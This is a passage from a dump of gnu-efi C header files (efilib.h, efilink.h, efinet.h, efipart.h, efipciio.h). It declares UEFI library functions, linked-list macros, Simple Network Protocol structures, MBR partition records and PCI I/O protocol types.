    IN OUT UINTN                    *NoHandles,
    OUT EFI_HANDLE                  **Buffer
    );

EFI_STATUS
LibInstallProtocolInterfaces (
    IN OUT EFI_HANDLE       *Handle,
    ...
    );

VOID
LibUninstallProtocolInterfaces (
    IN EFI_HANDLE           Handle,
    ...
    );

EFI_STATUS
LibReinstallProtocolInterfaces (
    IN OUT EFI_HANDLE           *Handle,
    ...
    );

EFI_EVENT
LibCreateProtocolNotifyEvent (
    IN EFI_GUID             *ProtocolGuid,
    IN EFI_TPL              NotifyTpl,
    IN EFI_EVENT_NOTIFY     NotifyFunction,
    IN VOID                 *NotifyContext,
    OUT VOID                *Registration
    );

EFI_STATUS
WaitForSingleEvent (
    IN EFI_EVENT        Event,
    IN UINT64           Timeout OPTIONAL
    );

VOID
WaitForEventWithTimeout (
    IN  EFI_EVENT       Event,
    IN  UINTN           Timeout,
    IN  UINTN           Row,
    IN  UINTN           Column,
    IN  CHAR16          *String,
    IN  EFI_INPUT_KEY   TimeoutKey,
    OUT EFI_INPUT_KEY   *Key
    );

EFI_FILE_HANDLE
LibOpenRoot (
    IN EFI_HANDLE           DeviceHandle
    );

EFI_FILE_INFO *
LibFileInfo (
    IN EFI_FILE_HANDLE      FHand
    );

EFI_FILE_SYSTEM_INFO *
LibFileSystemInfo (
    IN EFI_FILE_HANDLE      FHand
    );

EFI_FILE_SYSTEM_VOLUME_LABEL_INFO *
LibFileSystemVolumeLabelInfo (
    IN EFI_FILE_HANDLE      FHand
    );

BOOLEAN
ValidMBR(
    IN  MASTER_BOOT_RECORD  *Mbr,
    IN  EFI_BLOCK_IO        *BlkIo
    );

BOOLEAN
LibMatchDevicePaths (
    IN  EFI_DEVICE_PATH *Multi,
    IN  EFI_DEVICE_PATH *Single
    );

EFI_DEVICE_PATH *
LibDuplicateDevicePathInstance (
    IN EFI_DEVICE_PATH  *DevPath
    );

EFI_DEVICE_PATH *
DevicePathFromHandle (
    IN EFI_HANDLE           Handle
    );

EFI_DEVICE_PATH *
DevicePathInstance (
    IN OUT EFI_DEVICE_PATH  **DevicePath,
    OUT UINTN               *Size
    );

UINTN
DevicePathInstanceCount (
    IN EFI_DEVICE_PATH      *DevicePath
    );

EFI_DEVICE_PATH *
AppendDevicePath (
    IN EFI_DEVICE_PATH      *Src1,
    IN EFI_DEVICE_PATH      *Src2
    );

EFI_DEVICE_PATH *
AppendDevicePathNode (
    IN EFI_DEVICE_PATH      *Src1,
    IN EFI_DEVICE_PATH      *Src2
    );

EFI_DEVICE_PATH*
AppendDevicePathInstance (
    IN EFI_DEVICE_PATH  *Src,
    IN EFI_DEVICE_PATH  *Instance
    );

EFI_DEVICE_PATH *
FileDevicePath (
    IN EFI_HANDLE           Device  OPTIONAL,
    IN CHAR16               *FileName
    );

UINTN
DevicePathSize (
    IN EFI_DEVICE_PATH      *DevPath
    );

EFI_DEVICE_PATH *
DuplicateDevicePath (
    IN EFI_DEVICE_PATH      *DevPath
    );

EFI_DEVICE_PATH *
UnpackDevicePath (
    IN EFI_DEVICE_PATH      *DevPath
    );

EFI_STATUS
LibDevicePathToInterface (
    IN EFI_GUID             *Protocol,
    IN EFI_DEVICE_PATH      *FilePath,
    OUT VOID                **Interface
    );

CHAR16 *
DevicePathToStr (
    EFI_DEVICE_PATH         *DevPath
    );

//
// BugBug: I need my own include files
//
typedef struct {
    UINT8   Register;
    UINT8   Function;
    UINT8   Device;
    UINT8   Bus;
    UINT32  Reserved;
} EFI_ADDRESS;

typedef union {
    UINT64          Address;
    EFI_ADDRESS     EfiAddress;
} EFI_PCI_ADDRESS_UNION;


EFI_STATUS
PciFindDeviceClass (
    IN  OUT EFI_PCI_ADDRESS_UNION   *Address,
    IN      UINT8                   BaseClass,
    IN      UINT8                   SubClass
    );

EFI_STATUS
PciFindDevice (
    IN  OUT EFI_PCI_ADDRESS_UNION   *DeviceAddress,
    IN      UINT16                  VendorId,
    IN      UINT16                  DeviceId,
    IN OUT  PCI_TYPE00              *Pci
    );

//
// SIMPLE_READ_FILE object used to access files
//

typedef VOID        *SIMPLE_READ_FILE;

EFI_STATUS
OpenSimpleReadFile (
    IN BOOLEAN                  BootPolicy,
    IN VOID                     *SourceBuffer   OPTIONAL,
    IN UINTN                    SourceSize,
    IN OUT EFI_DEVICE_PATH      **FilePath,
    OUT EFI_HANDLE              *DeviceHandle,
    OUT SIMPLE_READ_FILE        *SimpleReadHandle
    );

EFI_STATUS
ReadSimpleReadFile (
    IN SIMPLE_READ_FILE     SimpleReadHandle,
    IN UINTN                Offset,
    IN OUT UINTN            *ReadSize,
    OUT VOID                *Buffer
    );


VOID
CloseSimpleReadFile (
    IN SIMPLE_READ_FILE     SimpleReadHandle
    );

VOID
InitializeGuid (
    VOID
    );

UINT8
DecimaltoBCD(
    IN  UINT8 DecValue
    );

UINT8
BCDtoDecimal(
    IN  UINT8 BcdValue
    );

EFI_STATUS
LibGetSystemConfigurationTable(
    IN EFI_GUID *TableGuid,
    IN OUT VOID **Table
    );

BOOLEAN
LibIsValidTextGraphics (
    IN  CHAR16  Graphic,
    OUT CHAR8   *PcAnsi,    OPTIONAL
    OUT CHAR8   *Ascii      OPTIONAL
    );

BOOLEAN
IsValidAscii (
    IN  CHAR16  Ascii
    );

BOOLEAN
IsValidEfiCntlChar (
    IN  CHAR16  c
    );

CHAR16 *
LibGetUiString (
    IN  EFI_HANDLE      Handle,
    IN  UI_STRING_TYPE  StringType,
    IN  ISO_639_2       *LangCode,
    IN  BOOLEAN         ReturnDevicePathStrOnMismatch
    );

CHAR8*
LibGetSmbiosString (
    IN  SMBIOS_STRUCTURE_POINTER    *Smbios,
    IN  UINT16                      StringNumber
    );

EFI_STATUS
LibGetSmbiosSystemGuidAndSerialNumber (
    IN  EFI_GUID    *SystemGuid,
    OUT CHAR8       **SystemSerialNumber
    );


EFI_STATUS
InitializeGlobalIoDevice (
        IN  EFI_DEVICE_PATH             *DevicePath,
        IN  EFI_GUID                    *Protocol,
        IN  CHAR8                       *ErrorStr,
        OUT EFI_DEVICE_IO_INTERFACE     **GlobalIoFncs
        );

UINT32
ReadPort (
        IN  EFI_DEVICE_IO_INTERFACE     *GlobalIoFncs,
        IN  EFI_IO_WIDTH                Width,
        IN  UINTN                       Port
        );

UINT32
WritePort (
        IN  EFI_DEVICE_IO_INTERFACE     *GlobalIoFncs,
        IN  EFI_IO_WIDTH                Width,
        IN  UINTN                       Port,
        IN  UINTN                       Data
        );

UINT32
ReadPciConfig (
        IN  EFI_DEVICE_IO_INTERFACE     *GlobalIoFncs,
        IN  EFI_IO_WIDTH                Width,
        IN  UINTN                       Port
        );

UINT32
WritePciConfig (
        IN  EFI_DEVICE_IO_INTERFACE     *GlobalIoFncs,
        IN  EFI_IO_WIDTH                Width,
        IN  UINTN                       Port,
        IN  UINTN                       Data
        );

VOID
Pause (
    VOID
);

extern EFI_DEVICE_IO_INTERFACE  *GlobalIoFncs;

#define outp(_Port, _DataByte)  (UINT8)WritePort(GlobalIoFncs,  IO_UINT8,  (UINTN)_Port, (UINTN)_DataByte)
#define inp(_Port)              (UINT8)ReadPort(GlobalIoFncs,   IO_UINT8,  (UINTN)_Port)
#define outpw(_Port, _DataByte) (UINT16)WritePort(GlobalIoFncs, IO_UINT16, (UINTN)_Port, (UINTN)_DataByte)
#define inpw(_Port)             (UINT16)ReadPort(GlobalIoFncs,  IO_UINT16, (UINTN)_Port)
#define outpd(_Port, _DataByte) (UINT32)WritePort(GlobalIoFncs, IO_UINT32, (UINTN)_Port, (UINTN)_DataByte)
#define inpd(_Port)             (UINT32)ReadPort(GlobalIoFncs,  IO_UINT32, (UINTN)_Port)

#define writepci8(_Addr, _DataByte)  (UINT8)WritePciConfig(GlobalIoFncs,  IO_UINT8,  (UINTN)_Addr, (UINTN)_DataByte)
#define readpci8(_Addr)              (UINT8)ReadPciConfig(GlobalIoFncs,   IO_UINT8,  (UINTN)_Addr)
#define writepci16(_Addr, _DataByte) (UINT16)WritePciConfig(GlobalIoFncs, IO_UINT16, (UINTN)_Addr, (UINTN)_DataByte)
#define readpci16(_Addr)             (UINT16)ReadPciConfig(GlobalIoFncs,  IO_UINT16, (UINTN)_Addr)
#define writepci32(_Addr, _DataByte) (UINT32)WritePciConfig(GlobalIoFncs, IO_UINT32, (UINTN)_Addr, (UINTN)_DataByte)
#define readpci32(_Addr)             (UINT32)ReadPciConfig(GlobalIoFncs,  IO_UINT32, (UINTN)_Addr)

#define Port80(_PostCode)   GlobalIoFncs->Io.Write (GlobalIoFncs, IO_UINT16, (UINT64)0x80, 1, &(_PostCode))

#endif

```

`include/gnu-efi/efilink.h`:

```h
#ifndef _EFI_LINK_H
#define _EFI_LINK_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    link.h (renamed efilink.h to avoid conflicts)

Abstract:

    EFI link list macro's



Revision History

--*/

#ifndef EFI_NT_EMUL

//
// List entry - doubly linked list
//

typedef struct _LIST_ENTRY EFI_LIST_ENTRY;

#endif 


//
//  VOID
//  InitializeListHead(
//      LIST_ENTRY *ListHead
//      );
//

#define InitializeListHead(ListHead) \
    (ListHead)->Flink = ListHead;    \
    (ListHead)->Blink = ListHead;

//
//  BOOLEAN
//  IsListEmpty(
//      PLIST_ENTRY ListHead
//      );
//

#define IsListEmpty(ListHead) \
    ((ListHead)->Flink == (ListHead))

//
//  VOID
//  RemoveEntryList(
//      PLIST_ENTRY Entry
//      );
//

#define _RemoveEntryList(Entry) {       \
        LIST_ENTRY *_Blink, *_Flink;    \
        _Flink = (Entry)->Flink;        \
        _Blink = (Entry)->Blink;        \
        _Blink->Flink = _Flink;         \
        _Flink->Blink = _Blink;         \
        }

#if EFI_DEBUG
    #define RemoveEntryList(Entry)                      \
        _RemoveEntryList(Entry);                        \
        (Entry)->Flink = (LIST_ENTRY *) BAD_POINTER;    \
        (Entry)->Blink = (LIST_ENTRY *) BAD_POINTER; 
#else
    #define RemoveEntryList(Entry)      \
        _RemoveEntryList(Entry);
#endif

//
//  VOID
//  InsertTailList(
//      PLIST_ENTRY ListHead,
//      PLIST_ENTRY Entry
//      );
//

#define InsertTailList(ListHead,Entry) {\
    LIST_ENTRY *_ListHead, *_Blink;     \
    _ListHead = (ListHead);             \
    _Blink = _ListHead->Blink;          \
    (Entry)->Flink = _ListHead;         \
    (Entry)->Blink = _Blink;            \
    _Blink->Flink = (Entry);            \
    _ListHead->Blink = (Entry);         \
    }

//
//  VOID
//  InsertHeadList(
//      PLIST_ENTRY ListHead,
//      PLIST_ENTRY Entry
//      );
//

#define InsertHeadList(ListHead,Entry) {\
    LIST_ENTRY *_ListHead, *_Flink;     \
    _ListHead = (ListHead);             \
    _Flink = _ListHead->Flink;          \
    (Entry)->Flink = _Flink;            \
    (Entry)->Blink = _ListHead;         \
    _Flink->Blink = (Entry);            \
    _ListHead->Flink = (Entry);         \
    }

//  VOID
//  SwapListEntries(
//      PLIST_ENTRY Entry1,
//      PLIST_ENTRY Entry2
//      );
//
// Put Entry2 before Entry1
//
#define SwapListEntries(Entry1,Entry2) {\
    LIST_ENTRY *Entry1Flink, *Entry1Blink;     \
    LIST_ENTRY *Entry2Flink, *Entry2Blink;     \
    Entry2Flink = (Entry2)->Flink;             \
    Entry2Blink = (Entry2)->Blink;             \
    Entry1Flink = (Entry1)->Flink;             \
    Entry1Blink = (Entry1)->Blink;             \
    Entry2Blink->Flink = Entry2Flink;       \
    Entry2Flink->Blink = Entry2Blink;        \
    (Entry2)->Flink = Entry1;               \
    (Entry2)->Blink = Entry1Blink;          \
    Entry1Blink->Flink = (Entry2);            \
    (Entry1)->Blink = (Entry2);             \
    }

//
//  EFI_FIELD_OFFSET - returns the byte offset to a field within a structure
//

#define EFI_FIELD_OFFSET(TYPE,Field) ((UINTN)(intptr_t)(&(((TYPE *) 0)->Field)))

//
//  CONTAINING_RECORD - returns a pointer to the structure
//      from one of it's elements.
//

#define _CR(Record, TYPE, Field)  \
    ((TYPE *) ( (CHAR8 *)(Record) - (CHAR8 *) &(((TYPE *) 0)->Field)))

//
// EDK2 uses BASE_CR for the above
//
#define BASE_CR _CR

#if EFI_DEBUG
    #define CR(Record, TYPE, Field, Sig)     \
        _CR(Record, TYPE, Field)->Signature != Sig ?        \
            (TYPE *) ASSERT_STRUCT(_CR(Record, TYPE, Field), Record) : \
            _CR(Record, TYPE, Field)
#else
    #define CR(Record, TYPE, Field, Signature)   \
        _CR(Record, TYPE, Field)                           
#endif


//
// A lock structure
//

typedef struct _FLOCK {
    EFI_TPL     Tpl;
    EFI_TPL     OwnerTpl;
    UINTN       Lock;
} FLOCK;

#endif


```

`include/gnu-efi/efinet.h`:

```h
#ifndef _EFINET_H
#define _EFINET_H


/*++
Copyright (c) 1999  Intel Corporation

Module Name:
    efinet.h

Abstract:
    EFI Simple Network protocol

Revision History
--*/


///////////////////////////////////////////////////////////////////////////////
//
//      Simple Network Protocol
//

#define EFI_SIMPLE_NETWORK_PROTOCOL_GUID \
    { 0xA19832B9, 0xAC25, 0x11D3, {0x9A, 0x2D, 0x00, 0x90, 0x27, 0x3F, 0xC1, 0x4D} }

INTERFACE_DECL(_EFI_SIMPLE_NETWORK_PROTOCOL);

///////////////////////////////////////////////////////////////////////////////
//

typedef struct {
    //
    // Total number of frames received.  Includes frames with errors and
    // dropped frames.
    //
    UINT64  RxTotalFrames;

    //
    // Number of valid frames received and copied into receive buffers.
    //
    UINT64  RxGoodFrames;

    //
    // Number of frames below the minimum length for the media.
    // This would be <64 for ethernet.
    //
    UINT64  RxUndersizeFrames;

    //
    // Number of frames longer than the maxminum length for the
    // media.  This would be >1500 for ethernet.
    //
    UINT64  RxOversizeFrames;

    //
    // Valid frames that were dropped because receive buffers were full.
    //
    UINT64  RxDroppedFrames;

    //
    // Number of valid unicast frames received and not dropped.
    //
    UINT64  RxUnicastFrames;

    //
    // Number of valid broadcast frames received and not dropped.
    //
    UINT64  RxBroadcastFrames;

    //
    // Number of valid mutlicast frames received and not dropped.
    //
    UINT64  RxMulticastFrames;

    //
    // Number of frames w/ CRC or alignment errors.
    //
    UINT64  RxCrcErrorFrames;

    //
    // Total number of bytes received.  Includes frames with errors
    // and dropped frames.
    //
    UINT64  RxTotalBytes;

    //
    // Transmit statistics.
    //
    UINT64  TxTotalFrames;
    UINT64  TxGoodFrames;
    UINT64  TxUndersizeFrames;
    UINT64  TxOversizeFrames;
    UINT64  TxDroppedFrames;
    UINT64  TxUnicastFrames;
    UINT64  TxBroadcastFrames;
    UINT64  TxMulticastFrames;
    UINT64  TxCrcErrorFrames;
    UINT64  TxTotalBytes;

    //
    // Number of collisions detection on this subnet.
    //
    UINT64  Collisions;

    //
    // Number of frames destined for unsupported protocol.
    //
    UINT64  UnsupportedProtocol;

} EFI_NETWORK_STATISTICS;

///////////////////////////////////////////////////////////////////////////////
//

typedef enum {
    EfiSimpleNetworkStopped,
    EfiSimpleNetworkStarted,
    EfiSimpleNetworkInitialized,
    EfiSimpleNetworkMaxState
} EFI_SIMPLE_NETWORK_STATE;

///////////////////////////////////////////////////////////////////////////////
//

#define EFI_SIMPLE_NETWORK_RECEIVE_UNICAST               0x01
#define EFI_SIMPLE_NETWORK_RECEIVE_MULTICAST             0x02
#define EFI_SIMPLE_NETWORK_RECEIVE_BROADCAST             0x04
#define EFI_SIMPLE_NETWORK_RECEIVE_PROMISCUOUS           0x08
#define EFI_SIMPLE_NETWORK_RECEIVE_PROMISCUOUS_MULTICAST 0x10

///////////////////////////////////////////////////////////////////////////////
//

#define EFI_SIMPLE_NETWORK_RECEIVE_INTERRUPT        0x01
#define EFI_SIMPLE_NETWORK_TRANSMIT_INTERRUPT       0x02
#define EFI_SIMPLE_NETWORK_COMMAND_INTERRUPT        0x04
#define EFI_SIMPLE_NETWORK_SOFTWARE_INTERRUPT       0x08

///////////////////////////////////////////////////////////////////////////////
//
#define MAX_MCAST_FILTER_CNT    16
typedef struct {
    UINT32                      State;
    UINT32                      HwAddressSize;
    UINT32                      MediaHeaderSize;
    UINT32                      MaxPacketSize;
    UINT32                      NvRamSize;
    UINT32                      NvRamAccessSize;
    UINT32                      ReceiveFilterMask;
    UINT32                      ReceiveFilterSetting;
    UINT32                      MaxMCastFilterCount;
    UINT32                      MCastFilterCount;
    EFI_MAC_ADDRESS             MCastFilter[MAX_MCAST_FILTER_CNT];
    EFI_MAC_ADDRESS             CurrentAddress;
    EFI_MAC_ADDRESS             BroadcastAddress;
    EFI_MAC_ADDRESS             PermanentAddress;
    UINT8                       IfType;
    BOOLEAN                     MacAddressChangeable;
    BOOLEAN                     MultipleTxSupported;
    BOOLEAN                     MediaPresentSupported;
    BOOLEAN                     MediaPresent;
} EFI_SIMPLE_NETWORK_MODE;

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_START) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_STOP) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_INITIALIZE) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This,
    IN UINTN                                ExtraRxBufferSize  OPTIONAL,
    IN UINTN                                ExtraTxBufferSize  OPTIONAL
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_RESET) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This,
    IN BOOLEAN                              ExtendedVerification
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_SHUTDOWN) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_RECEIVE_FILTERS) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This,
    IN UINT32                               Enable,
    IN UINT32                               Disable,
    IN BOOLEAN                              ResetMCastFilter,
    IN UINTN                                MCastFilterCnt     OPTIONAL,
    IN EFI_MAC_ADDRESS                      *MCastFilter       OPTIONAL
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_STATION_ADDRESS) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This,
    IN BOOLEAN                              Reset,
    IN EFI_MAC_ADDRESS                      *New      OPTIONAL
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_STATISTICS) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This,
    IN BOOLEAN                              Reset,
    IN OUT UINTN                            *StatisticsSize   OPTIONAL,
    OUT EFI_NETWORK_STATISTICS              *StatisticsTable  OPTIONAL
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_MCAST_IP_TO_MAC) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This,
    IN BOOLEAN                              IPv6,
    IN EFI_IP_ADDRESS                       *IP,
    OUT EFI_MAC_ADDRESS                     *MAC
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_NVDATA) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This,
    IN BOOLEAN                              ReadWrite,
    IN UINTN                                Offset,
    IN UINTN                                BufferSize,
    IN OUT VOID                             *Buffer
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_GET_STATUS) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This,
    OUT UINT32                              *InterruptStatus  OPTIONAL,
    OUT VOID                                **TxBuf           OPTIONAL
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_TRANSMIT) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This,
    IN UINTN                                HeaderSize,
    IN UINTN                                BufferSize,
    IN VOID                                 *Buffer,
    IN EFI_MAC_ADDRESS                      *SrcAddr     OPTIONAL,
    IN EFI_MAC_ADDRESS                      *DestAddr    OPTIONAL,
    IN UINT16                               *Protocol    OPTIONAL
);

///////////////////////////////////////////////////////////////////////////////
//

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_NETWORK_RECEIVE) (
    IN struct _EFI_SIMPLE_NETWORK_PROTOCOL  *This,
    OUT UINTN                               *HeaderSize  OPTIONAL,
    IN OUT UINTN                            *BufferSize,
    OUT VOID                                *Buffer,
    OUT EFI_MAC_ADDRESS                     *SrcAddr     OPTIONAL,
    OUT EFI_MAC_ADDRESS                     *DestAddr    OPTIONAL,
    OUT UINT16                              *Protocol    OPTIONAL
);

///////////////////////////////////////////////////////////////////////////////
//

#define EFI_SIMPLE_NETWORK_PROTOCOL_REVISION  0x00010000
#define EFI_SIMPLE_NETWORK_INTERFACE_REVISION EFI_SIMPLE_NETWORK_PROTOCOL_REVISION

typedef struct _EFI_SIMPLE_NETWORK_PROTOCOL {
    UINT64                              Revision;
    EFI_SIMPLE_NETWORK_START            Start;
    EFI_SIMPLE_NETWORK_STOP             Stop;
    EFI_SIMPLE_NETWORK_INITIALIZE       Initialize;
    EFI_SIMPLE_NETWORK_RESET            Reset;
    EFI_SIMPLE_NETWORK_SHUTDOWN         Shutdown;
    EFI_SIMPLE_NETWORK_RECEIVE_FILTERS  ReceiveFilters;
    EFI_SIMPLE_NETWORK_STATION_ADDRESS  StationAddress;
    EFI_SIMPLE_NETWORK_STATISTICS       Statistics;
    EFI_SIMPLE_NETWORK_MCAST_IP_TO_MAC  MCastIpToMac;
    EFI_SIMPLE_NETWORK_NVDATA           NvData;
    EFI_SIMPLE_NETWORK_GET_STATUS       GetStatus;
    EFI_SIMPLE_NETWORK_TRANSMIT         Transmit;
    EFI_SIMPLE_NETWORK_RECEIVE          Receive;
    EFI_EVENT                           WaitForPacket;
    EFI_SIMPLE_NETWORK_MODE             *Mode;
} EFI_SIMPLE_NETWORK_PROTOCOL;

// Note: Because it conflicted with the EDK2 struct name, the
// 'EFI_SIMPLE_NETWORK_PROTOCOL' GUID definition, from older
// versions of gnu-efi, is now obsoleted.
// Use 'EFI_SIMPLE_NETWORK_PROTOCOL_GUID' instead.

typedef struct _EFI_SIMPLE_NETWORK_PROTOCOL _EFI_SIMPLE_NETWORK;
typedef EFI_SIMPLE_NETWORK_PROTOCOL EFI_SIMPLE_NETWORK;

#endif /* _EFINET_H */

```

`include/gnu-efi/efipart.h`:

```h
#ifndef _EFI_PART_H
#define _EFI_PART_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efipart.h
    
Abstract:   
    Info about disk partitions and Master Boot Records




Revision History

--*/

//
//
//

#define EFI_PARTITION   0xef
#define MBR_SIZE        512

#pragma pack(1)

typedef struct {
    UINT8       BootIndicator;
    UINT8       StartHead;
    UINT8       StartSector;
    UINT8       StartTrack;
    UINT8       OSIndicator;
    UINT8       EndHead;
    UINT8       EndSector;
    UINT8       EndTrack;
    UINT8       StartingLBA[4];
    UINT8       SizeInLBA[4];
} MBR_PARTITION_RECORD;

#define EXTRACT_UINT32(D) (UINT32)(D[0] | (D[1] << 8) | (D[2] << 16) | (D[3] << 24))

#define MBR_SIGNATURE           0xaa55
#define MIN_MBR_DEVICE_SIZE     0x80000
#define MBR_ERRATA_PAD          0x40000 // 128 MB

#define MAX_MBR_PARTITIONS  4   
typedef struct {
    UINT8                   BootStrapCode[440];
    UINT8                   UniqueMbrSignature[4];
    UINT8                   Unknown[2];
    MBR_PARTITION_RECORD    Partition[MAX_MBR_PARTITIONS];
    UINT16                  Signature;
} MASTER_BOOT_RECORD;
#pragma pack()


#endif

```

`include/gnu-efi/efipciio.h`:

```h
#ifndef _EFI_PCI_IO_H
#define _EFI_PCI_IO_H

#define EFI_PCI_IO_PROTOCOL_GUID \
    { 0x4cf5b200, 0x68b8, 0x4ca5, {0x9e, 0xec, 0xb2, 0x3e, 0x3f, 0x50, 0x02, 0x9a} }

#define EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_GUID \
    { 0x2f707ebb, 0x4a1a, 0x11d4, {0x9a, 0x38, 0x00, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }

INTERFACE_DECL(_EFI_PCI_IO_PROTOCOL);
INTERFACE_DECL(_EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL);

typedef enum {
    EfiPciIoWidthUint8,
    EfiPciIoWidthUint16,
    EfiPciIoWidthUint32,
    EfiPciIoWidthUint64,
    EfiPciIoWidthFifoUint8,
    EfiPciIoWidthFifoUint16,
    EfiPciIoWidthFifoUint32,
    EfiPciIoWidthFifoUint64,
    EfiPciIoWidthFillUint8,
    EfiPciIoWidthFillUint16,
    EfiPciIoWidthFillUint32,
    EfiPciIoWidthFillUint64,
    EfiPciIoWidthMaximum
} EFI_PCI_IO_PROTOCOL_WIDTH, EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_WIDTH;

#define EFI_PCI_IO_PASS_THROUGH_BAR 0xff

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_POLL_IO_MEM) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This,
  IN EFI_PCI_IO_PROTOCOL_WIDTH    Width,
  IN UINT8                        BarIndex,
  IN UINT64                       Offset,
  IN UINT64                       Mask,
  IN UINT64                       Value,
  IN UINT64                       Delay,
  OUT UINT64                      *Result
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_POLL_IO_MEM) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL  *This,
  IN EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_WIDTH    Width,
  IN UINT64                                   Address,
  IN UINT64                                   Mask,
  IN UINT64                                   Value,
  IN UINT64                                   Delay,
  OUT UINT64                                  *Result
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_IO_MEM) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This,
  IN EFI_PCI_IO_PROTOCOL_WIDTH    Width,
  IN UINT8                        BarIndex,
  IN UINT64                       Offset,
  IN UINTN                        Count,
  IN OUT VOID                     *Buffer
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_IO_MEM) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL  *This,
  IN EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_WIDTH    Width,
  IN UINT64                                   Address,
  IN UINTN                                    Count,
  IN OUT VOID                                 *Buffer
);

typedef struct {
  EFI_PCI_IO_PROTOCOL_IO_MEM    Read;
  EFI_PCI_IO_PROTOCOL_IO_MEM    Write;
} EFI_PCI_IO_PROTOCOL_ACCESS;

typedef struct {
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_IO_MEM  Read;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_IO_MEM  Write;
} EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_ACCESS;

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_CONFIG) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This,
  IN EFI_PCI_IO_PROTOCOL_WIDTH    Width,
  IN UINT32                       Offset,
  IN UINTN                        Count,
  IN OUT VOID                     *Buffer
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_CONFIGURATION) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL    *This,
  OUT VOID                                      **Resources
);

typedef struct {
  EFI_PCI_IO_PROTOCOL_CONFIG Read;
  EFI_PCI_IO_PROTOCOL_CONFIG Write;
} EFI_PCI_IO_PROTOCOL_CONFIG_ACCESS;

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_COPY_MEM) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This,
  IN EFI_PCI_IO_PROTOCOL_WIDTH    Width,
  IN UINT8                        DestBarIndex,
  IN UINT64                       DestOffset,
  IN UINT8                        SrcBarIndex,
  IN UINT64                       SrcOffset,
  IN UINTN                        Count
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_COPY_MEM) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL  *This,
  IN EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_WIDTH    Width,
  IN UINT64                                   DestAddress,
  IN UINT64                                   SrcAddress,
  IN UINTN                                    Count
);

typedef enum {
    EfiPciIoOperationBusMasterRead,
    EfiPciIoOperationBusMasterWrite,
    EfiPciIoOperationBusMasterCommonBuffer,
    EfiPciIoOperationMaximum
} EFI_PCI_IO_PROTOCOL_OPERATION;

typedef enum {
  EfiPciOperationBusMasterRead,
  EfiPciOperationBusMasterWrite,
  EfiPciOperationBusMasterCommonBuffer,
  EfiPciOperationBusMasterRead64,
  EfiPciOperationBusMasterWrite64,
  EfiPciOperationBusMasterCommonBuffer64,
  EfiPciOperationMaximum
} EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_OPERATION;

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_MAP) (
  IN struct _EFI_PCI_IO_PROTOCOL   *This,
